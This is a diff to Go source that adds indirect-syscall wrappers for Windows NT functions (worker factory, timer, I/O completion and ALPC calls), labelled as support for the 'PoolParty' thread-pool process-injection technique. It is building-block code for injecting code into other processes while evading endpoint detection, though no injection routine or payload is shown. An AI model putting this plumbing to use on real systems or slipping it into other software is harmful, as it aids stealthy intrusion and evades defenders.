@@ -130,6 +130,15 @@ func (r *SyscallResolver) init() error {
 		"NtSetContextThread",
 		"NtOpenThread",
 		"NtQueueApcThread",
+		"NtQueryInformationWorkerFactory",
+		"NtSetInformationWorkerFactory",
+		"NtSetTimer2",
+		"NtSetInformationFile",
+		"NtAssociateWaitCompletionPacket",
+		"NtSetIoCompletion",
+		"NtAlpcCreatePort",
+		"NtAlpcSetInformation",
+		"NtAlpcConnectPort",
 	}
 
 	for _, name := range keyFunctions {
@@ -709,5 +718,156 @@ func IndirectNtClose(handle uintptr) uint32 {
 		return 0xC0000001
 	}
 	r, _, _ := syscall.SyscallN(entry.StubAddr, handle)
+	return uint32(r)
+}
+
+// --- PoolParty Specific Nt* wrapper functions ---
+
+// IndirectNtQueryInformationWorkerFactory queries a worker factory via indirect syscall.
+func IndirectNtQueryInformationWorkerFactory(workerFactoryHandle uintptr, workerFactoryInformationClass uintptr, workerFactoryInformation uintptr, workerFactoryInformationLength uintptr, returnLength uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtQueryInformationWorkerFactory"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		workerFactoryHandle,
+		workerFactoryInformationClass,
+		workerFactoryInformation,
+		workerFactoryInformationLength,
+		returnLength,
+	)
+	return uint32(r)
+}
+
+// IndirectNtSetInformationWorkerFactory sets worker factory information via indirect syscall.
+func IndirectNtSetInformationWorkerFactory(workerFactoryHandle uintptr, workerFactoryInformationClass uintptr, workerFactoryInformation uintptr, workerFactoryInformationLength uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtSetInformationWorkerFactory"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		workerFactoryHandle,
+		workerFactoryInformationClass,
+		workerFactoryInformation,
+		workerFactoryInformationLength,
+	)
+	return uint32(r)
+}
+
+// IndirectNtSetTimer2 sets a timer via indirect syscall.
+func IndirectNtSetTimer2(timerHandle uintptr, dueTime uintptr, period uintptr, parameters uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtSetTimer2"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		timerHandle,
+		dueTime,
+		period,
+		parameters,
+	)
+	return uint32(r)
+}
+
+// IndirectZwSetInformationFile sets file information via indirect syscall.
+func IndirectZwSetInformationFile(fileHandle uintptr, ioStatusBlock uintptr, fileInformation uintptr, length uintptr, fileInformationClass uintptr) uint32 {
+	// Zw* calls resolve to the Nt* equivalent in user-mode ntdll exports
+	entry := indirectSyscallResolver.entries["NtSetInformationFile"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		fileHandle,
+		ioStatusBlock,
+		fileInformation,
+		length,
+		fileInformationClass,
+	)
+	return uint32(r)
+}
+
+// IndirectZwAssociateWaitCompletionPacket associates a wait completion packet via indirect syscall.
+func IndirectZwAssociateWaitCompletionPacket(waitCompletionPacketHandle uintptr, ioCompletionHandle uintptr, targetObjectHandle uintptr, keyContext uintptr, apcContext uintptr, ioStatus uintptr, ioStatusInformation uintptr, alreadySignaled uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtAssociateWaitCompletionPacket"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		waitCompletionPacketHandle,
+		ioCompletionHandle,
+		targetObjectHandle,
+		keyContext,
+		apcContext,
+		ioStatus,
+		ioStatusInformation,
+		alreadySignaled,
+	)
+	return uint32(r)
+}
+
+// IndirectZwSetIoCompletion queues an I/O completion packet via indirect syscall.
+func IndirectZwSetIoCompletion(ioCompletionHandle uintptr, keyContext uintptr, apcContext uintptr, ioStatus uintptr, ioStatusInformation uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtSetIoCompletion"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		ioCompletionHandle,
+		keyContext,
+		apcContext,
+		ioStatus,
+		ioStatusInformation,
+	)
+	return uint32(r)
+}
+
+// IndirectNtAlpcCreatePort creates an ALPC port via indirect syscall.
+func IndirectNtAlpcCreatePort(portHandle uintptr, objectAttributes uintptr, portAttributes uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtAlpcCreatePort"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		portHandle,
+		objectAttributes,
+		portAttributes,
+	)
+	return uint32(r)
+}
+
+// IndirectNtAlpcSetInformation sets ALPC port information via indirect syscall.
+func IndirectNtAlpcSetInformation(portHandle uintptr, portInformationClass uintptr, portInformation uintptr, length uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtAlpcSetInformation"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		portHandle,
+		portInformationClass,
+		portInformation,
+		length,
+	)
+	return uint32(r)
+}
+
+// IndirectNtAlpcConnectPort connects to an ALPC port via indirect syscall.
+func IndirectNtAlpcConnectPort(portHandle uintptr, portName uintptr, objectAttributes uintptr, portAttributes uintptr, flags uintptr, requiredServerSid uintptr, connectionMessage uintptr, bufferLength uintptr, outMessageAttributes uintptr, inMessageAttributes uintptr, timeout uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtAlpcConnectPort"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		portHandle,
+		portName,
+		objectAttributes,
+		portAttributes,
+		flags,
+		requiredServerSid,
+		connectionMessage,
+		bufferLength,
+		outMessageAttributes,
+		inMessageAttributes,
+		timeout,
+	)
 	return uint32(r)
 }
